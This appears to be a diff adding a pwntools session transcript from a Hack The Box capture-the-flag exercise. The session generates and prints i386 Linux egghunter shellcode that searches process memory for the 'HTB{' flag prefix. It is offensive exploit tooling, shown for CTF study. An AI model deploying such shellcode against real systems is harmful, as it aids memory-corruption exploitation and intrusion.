@@ -1,0 +1,44 @@
+>>> from pwn import *                                                              
+>>> egg = "\x48\x54\x42\x7b"                                                       
+>>>                                                                                
+>>> egghunter = asm(pwnlib.shellcraft.i386.linux.egghunter(egg, start_address = 0))
+>>> egghunter = pwnlib.shellcraft.i386.linux.egghunter(egg, start_address = 0)     
+>>> print egghunter                                                                
+    cld                                                                            
+    /* push 'HTB{' */                                                              
+    push 0x7b425448                                                                
+                                                                                   
+egghunter_loop_5:                                                                  
+    /* access(name='ebx', type=0) */                                               
+    xor ecx, ecx                                                                   
+    /* call access() */                                                            
+    push SYS_access /* 0x21 */                                                     
+    pop eax                                                                        
+    int 0x80                                                                       
+                                                                                   
+    cmp al, (-EFAULT /* 0xe */) & 0xff                                             
+    jz egghunter_nextpage_8                                                        
+                                                                                   
+    xor edx, edx                                                                   
+    mov dh, 0x400 >> 8                                                             
+egghunter_memcmp_6:                                                                
+    test edx, edx                                                                  
+    jz   egghunter_nextpage_8                                                      
+                                                                                   
+    push 1                                                                         
+    pop ecx                                                                        
+    mov edi, ebx                                                                   
+    mov esi, esp                                                                   
+    repe cmpsd                                                                     
+    jz egghunter_done_7                                                            
+                                                                                   
+    add ebx, 4                                                                     
+    dec edx                                                                        
+    jnz egghunter_memcmp_6                                                         
+                                                                                   
+egghunter_nextpage_8:                                                              
+    or   bx, 0xfff                                                                 
+    inc ebx                                                                        
+    jmp egghunter_loop_5                                                           
+egghunter_done_7:                                                                  
+
